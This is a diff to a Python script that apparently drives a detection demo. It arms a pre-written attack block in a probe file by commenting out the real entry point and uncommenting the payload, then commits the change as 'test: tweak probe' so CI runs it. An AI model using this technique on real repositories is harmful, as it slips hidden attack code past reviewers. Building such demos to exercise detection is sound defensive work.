@@ -17,11 +17,29 @@ from scripts.demo.ops import activate, step
 
 PROBE = "scripts/detection/demo_probe.py"
 PREFIX = "demo-attack-"
+ATTACK_HEADER = "# === ATTACK PAYLOAD"
 
 
 def git(*args: str, cwd: str | None = None) -> str:
     return subprocess.run(["git", *args], cwd=cwd, check=True, text=True,
                           capture_output=True).stdout.strip()
+
+
+def arm(text: str) -> str:
+    """Comment out the legitimate entrypoint and uncomment the attack block below the header.
+
+    Mirrors the manual Step 2. Idempotent: a no-op once `run_attack` is already live (`--again`).
+    """
+    if "\ndef run_attack(" in text:
+        return text
+    text = text.replace('\nif __name__ == "__main__":\n    smoke_check()\n',
+                        '\n# if __name__ == "__main__":\n#     smoke_check()\n')
+    head, sep, tail = text.partition(ATTACK_HEADER)
+    header_line, _, block = tail.partition("\n")
+    uncommented = "\n".join(line[2:] if line.startswith("# ") else
+                            line[1:] if line.startswith("#") else line
+                            for line in block.split("\n"))
+    return head + sep + header_line + "\n" + uncommented
 
 
 def open_demo_pr(repo: dict) -> dict | None:
@@ -36,11 +54,9 @@ def push_change(branch: str, base: str, stamp: str):
         git("worktree", "add", "--detach", worktree, f"origin/{base}")
         try:
             probe = Path(worktree) / PROBE
-            text = probe.read_text(encoding="utf-8")
-            # Unleash the pre-authored exploit by uncommenting its call (idempotent on --again).
-            text = text.replace("\n    # run_attack()\n", "\n    run_attack()\n")
+            text = arm(probe.read_text(encoding="utf-8"))
             # Bump the harmless value so every push is a real diff that triggers CI.
-            text = re.sub(r'^PROBE_NOTE = ".*"$', f'PROBE_NOTE = "stolen-agent-change-{stamp}"',
+            text = re.sub(r'^CHECK_NOTE = ".*"$', f'CHECK_NOTE = "stolen-agent-change-{stamp}"',
                           text, flags=re.M)
             probe.write_text(text, encoding="utf-8", newline="\n")
             git("commit", "-am", f"test: tweak probe {stamp}", cwd=worktree)
